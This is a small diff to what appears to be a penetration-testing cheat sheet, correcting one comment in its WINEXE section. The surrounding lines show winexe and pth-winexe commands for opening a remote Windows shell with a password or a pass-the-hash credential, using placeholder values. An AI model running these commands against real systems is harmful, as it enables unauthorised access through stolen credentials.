@@ -759,7 +759,7 @@ WINEXE
 # get shell on IP_here as user with password
 winexe -U domain_here/user_here%password_here cmd.exe
 
-# get shell on IP_here as user with ntlm hash
+# get shell on IP_here as user with lm:ntlm hash
 pth-winexe -U domain_here/user_here cmd.exe
 
 ```
